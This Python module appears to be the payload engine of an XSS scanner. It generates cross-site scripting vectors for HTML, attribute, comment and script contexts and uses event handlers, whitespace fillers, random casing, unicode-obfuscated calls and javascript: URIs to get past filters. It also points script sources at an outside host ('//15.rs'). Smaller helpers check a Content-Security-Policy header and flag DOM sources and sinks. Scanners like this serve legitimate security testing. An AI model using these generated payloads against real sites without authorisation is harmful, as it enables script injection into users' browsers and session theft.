import re
import random

ELEMENTS = ['html', 'd3v', 'a', 'details', 'img', 'svg']

JS_FILLERS = (';',)
SPACE_FILLERS = (' ', '%09', '%0a', '%0d', '/+/')
EQUAL_FILLERS = (' ', '%09', '%0a', '%0d', '+')
LEADING_FILLERS = (' ', '', '%0dx')

HANDLERS = {
    'onerror': ['img'],
    'onload': ['svg'],
    'onmouseover': ['a', 'html', 'd3v'],
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
}

PAYLOAD_FUNCTIONS = (
    '[1].find(confirm)', 'confirm()', '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()', 'alert(1)'
)


def generate_vectors(findings, html_response):

    embedded_scripts = _extract_scripts(html_response)
    script_index = 0
    buckets = {priority: [] for priority in range(11, 0, -1)}

    for key, entry in findings.items():
        ctx = entry['context']

        if ctx == 'html':
            for func in PAYLOAD_FUNCTIONS:
                buckets[10].append(f'<script>{func}</script>')

            lt_score = entry['score']['<']
            gt_score = entry['score']['>']
            terminators = ['//']
            if gt_score == 100:
                terminators.append('>')
            bad_tag = entry.get('details', {}).get('badTag', '')

            if lt_score:
                vectors = _gen_handler_vectors(
                    SPACE_FILLERS, EQUAL_FILLERS, LEADING_FILLERS,
                    HANDLERS, ELEMENTS, PAYLOAD_FUNCTIONS,
                    terminators, bad_tag
                )
                for v in vectors:
                    if v not in buckets[10]:
                        buckets[10].append(v)

        elif ctx == 'attribute':
            found = False
            tag_name = entry['details']['tag']
            attr_type = entry['details']['type']
            quote_char = entry['details'].get('quote', '') or ''
            attr_name = entry['details']['name']
            attr_val = entry['details']['value']
            qt_score = entry['score'].get(quote_char, 100)
            gt_score = entry['score']['>']
            terminators = ['//']
            if gt_score == 100:
                terminators.append('>')

            if gt_score == 100 and qt_score == 100:
                for v in _gen_handler_vectors(
                    SPACE_FILLERS, EQUAL_FILLERS, LEADING_FILLERS,
                    HANDLERS, ELEMENTS, PAYLOAD_FUNCTIONS,
                    terminators
                ):
                    payload = quote_char + '>' + v
                    found = True
                    buckets[9].append(payload)

            if qt_score == 100:
                for fill in SPACE_FILLERS:
                    for func in PAYLOAD_FUNCTIONS:
                        vect = (
                            quote_char + fill + _rand_case('autofocus') +
                            fill + _rand_case('onfocus') + '=' + quote_char + func
                        )
                        found = True
                        buckets[8].append(vect)

            if qt_score == 90:
                for fill in SPACE_FILLERS:
                    for func in PAYLOAD_FUNCTIONS:
                        vect = (
                            '\\' + quote_char + fill + _rand_case('autofocus') + fill +
                            _rand_case('onfocus') + '=' + func + fill + '\\' + quote_char
                        )
                        found = True
                        buckets[7].append(vect)

            if attr_type == 'value':
                if attr_name == 'srcdoc':
                    if entry['score'].get('&lt;', 0) and entry['score'].get('&gt;', 0):
                        terminators = ['%26gt;']
                    for v in _gen_handler_vectors(
                        SPACE_FILLERS, EQUAL_FILLERS,
                        LEADING_FILLERS, HANDLERS,
                        ELEMENTS, PAYLOAD_FUNCTIONS,
                        terminators
                    ):
                        buckets[9].append(v.replace('<', '%26lt;'))

                elif attr_name == 'href' and attr_val == 's74l7a':
                    for func in PAYLOAD_FUNCTIONS:
                        buckets[10].append('javascript:' + func)

                elif attr_name.startswith('on'):
                    closer = _js_breaker(entry['details']['value'])
                    q = ''
                    for ch in entry['details']['value'].split('s74l7a')[1]:
                        if ch in ('"', "'", '`'):
                            q = ch
                            break
                        
                    for fill in JS_FILLERS:
                        for func in PAYLOAD_FUNCTIONS:
                            vect = q + closer + fill + func + '//\\'
                            if found:
                                buckets[7].append(vect)
                            else:
                                buckets[9].append(vect)

                    if qt_score > 83:
                        for fill in JS_FILLERS:
                            for func in PAYLOAD_FUNCTIONS:
                                fn = f'({func})' if '=' in func else func
                                use_f = '' if q == '' else fill
                                vect = '\\' + q + closer + use_f + fn + '//'  
                                if found:
                                    buckets[7].append(vect)
                                else:
                                    buckets[9].append(vect)

                elif tag_name in ('script', 'iframe', 'embed', 'object'):
                    if attr_name in ('src', 'iframe', 'embed') and attr_val == 's74l7a':
                        for payload in ['//15.rs', '\\/\\\\\\/\\15.rs']:
                            buckets[10].append(payload)

                    elif tag_name == 'object' and attr_name == 'data' and attr_val == 's74l7a':
                        for func in PAYLOAD_FUNCTIONS:
                            buckets[10].append('javascript:' + func)

                    elif qt_score == gt_score == 100:
                        for v in _gen_handler_vectors(
                            SPACE_FILLERS, EQUAL_FILLERS, LEADING_FILLERS,
                            HANDLERS, ELEMENTS, PAYLOAD_FUNCTIONS, terminators
                        ):
                            payload = quote_char + '>' + _rand_case('</script/>') + v
                            buckets[11].append(payload)

        elif ctx == 'comment':
            lt_score = entry['score']['<']
            gt_score = entry['score']['>']
            terminators = ['//']
            if gt_score == 100:
                terminators.append('>')
            if lt_score == 100:
                for v in _gen_handler_vectors(
                    SPACE_FILLERS, EQUAL_FILLERS, LEADING_FILLERS,
                    HANDLERS, ELEMENTS, PAYLOAD_FUNCTIONS, terminators
                ):
                    buckets[10].append(v)

        elif ctx == 'script':
            if embedded_scripts:
                try:
                    script = embedded_scripts[script_index]
                except IndexError:
                    script = embedded_scripts[0]
            else:
                continue
            closer = _js_breaker(script)
            quote_char = entry['details'].get('quote')
            scr_score = entry['score']['</scRipT/>']
            gt_score = entry['score']['>']
            brk_score = entry['score'].get(quote_char, 100) if quote_char else 100
            terminators = ['//']
            if gt_score == 100:
                terminators.append('>')

            if scr_score == 100:
                for v in _gen_handler_vectors(
                    SPACE_FILLERS, EQUAL_FILLERS, LEADING_FILLERS,
                    HANDLERS, ELEMENTS, PAYLOAD_FUNCTIONS, terminators
                ):
                    buckets[10].append(v)

            if closer:
                for fill in JS_FILLERS:
                    for func in PAYLOAD_FUNCTIONS:
                        vect = f"{quote_char}{closer}{fill}{func}//\\"
                        buckets[7].append(vect)
            elif brk_score > 83:
                prefix = '' if brk_score == 100 else '\\'
                for fill in JS_FILLERS:
                    for func in PAYLOAD_FUNCTIONS:
                        fn = f'({func})' if '=' in func else func
                        use_f = '' if quote_char == '' else fill
                        vect = f"{prefix}{quote_char}{closer}{use_f}{fn}//"
                        buckets[6].append(vect)

            script_index += 1

    return buckets


def _gen_handler_vectors(space, eq, lead, handlers, elements, chains, ends, bad_tag=None):
    vectors = []
    for tag in elements:
        bait = 's74l7a' if tag in ('a', 'd3v') else ''
        for event, valid_tags in handlers.items():
            if tag not in valid_tags:
                continue
            for func in chains:
                for sp in space:
                    for eqf in eq:
                        for lf in lead:
                            for term in ends:
                                final_term = '>' if tag in ('a', 'd3v') and '>' in ends else term
                                breaker = f"</{_rand_case(bad_tag)}>" if bad_tag else ''
                                vect = (
                                    f"{breaker}<" + _rand_case(tag) + sp +
                                    _rand_case(event) + eqf + '=' + eqf +
                                    func + lf + final_term + bait
                                )
                                vectors.append(vect)
    return vectors


def _extract_scripts(html):
    matches = re.findall(r'(?s)<script.*?>(.*?)</script>', html.lower())
    return [m for m in matches if 's74l7a' in m]


def _js_breaker(script_text):
    head = script_text.split('s74l7a')[0]
    cleaned = re.sub(r'(?s)\{.*?\}|\(.*?\)|".*?"|\'.*?\'', '', head)
    breaker = ''
    for idx, ch in enumerate(cleaned):
        if ch == '{': breaker += '}'
        elif ch == '(': breaker += ';)'
        elif ch == '[': breaker += ']'
        elif ch == '/' and idx + 1 < len(cleaned) and cleaned[idx+1] == '*':
            breaker += '/*'
        elif ch in '})]':
            breaker = _strip_last(breaker, ch)
    return breaker[::-1]


def _strip_last(text, sub):
    rev = text[::-1]
    out, removed = '', False
    for ch in rev:
        if ch == sub and not removed:
            removed = True
        else:
            out += ch
    return out[::-1]


def _rand_case(s):
    return ''.join(random.choice((a, b)) for a, b in zip(s.upper(), s.lower()))


def fill_holes(orig, new):
    result, extra = [], 0
    for x, y in zip(orig, new):
        if int(x) == y + extra:
            result.append(y)
        else:
            result.extend([0, y])
            extra += int(x) - y
    return result


def escaped(pos, text):
    snippet = text[:pos][::-1]
    match = re.match(r'^\\*', snippet)
    if not match:
        return False
    cnt = len(match.group())
    return cnt == 1 or (cnt % 2 != 0)


def csp_blocks_inline(headers):
    csp = ''
    for k, v in headers.items():
        if k.lower() == 'content-security-policy':
            csp = v
            break
    if not csp:
        return False
    m = re.search(r"script-src\s+([^;]*)", csp)
    if m:
        srcs = m.group(1)
        if "'unsafe-inline'" in srcs or "'strict-dynamic'" in srcs:
            return False
    return True

def check_dom(text):
    RED = '\033[91m'
    YELLOW = '\033[93m'
    END = '\033[0m'
    highlighted = []

    sources_pattern = (
        r'''\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)'''
        r'''|location\.(href|search|hash|pathname)|window\.name'''
        r'''|history\.(pushState|replaceState)(local|session)Storage)\b'''
    )
    sinks_pattern = (
        r'''\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen'''
        r'''|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript'''
        r'''|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent'''
        r'''|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML'''
        r'''|Range\.createContextualFragment|(document|window)\.location)\b'''
    )

    scripts = re.findall(r'(?i)(?s)<script[^>]*>(.*?)</script>', text)
    sink_found = False
    source_found = False

    for script in scripts:
        lines = script.split('\n')
        all_controlled_vars = set()

        try:
            for original_line in lines:
                parts = original_line.split('var ')
                controlled_vars = set()
                line = original_line

                if len(parts) > 1:
                    for part in parts:
                        for var in all_controlled_vars:
                            if var in part:
                                match = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part)
                                if match:
                                    controlled_vars.add(match.group().replace('$', r'\$'))

                for grp in re.finditer(sources_pattern, original_line):
                    source = original_line[grp.start(): grp.end()].replace(' ', '')
                    if source:
                        if len(parts) > 1:
                            for part in parts:
                                if source in part:
                                    match = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part)
                                    if match:
                                        controlled_vars.add(match.group().replace('$', r'\$'))
                        line = line.replace(source, f"{YELLOW}{source}{END}")

                all_controlled_vars.update(controlled_vars)

                for var in all_controlled_vars:
                    if re.search(rf'\b{var}\b', line):
                        source_found = True
                        line = re.sub(rf'\b{var}\b', f"{YELLOW}{var}{END}", line)

                for grp in re.finditer(sinks_pattern, original_line):
                    sink = original_line[grp.start(): grp.end()].replace(' ', '')
                    if sink:
                        line = line.replace(sink, f"{RED}{sink}{END}")
                        sink_found = True

                if line != original_line:
                    highlighted.append(f"{line.lstrip(' ')}")

        except MemoryError:
            continue

    if sink_found or source_found:
        return highlighted
    return []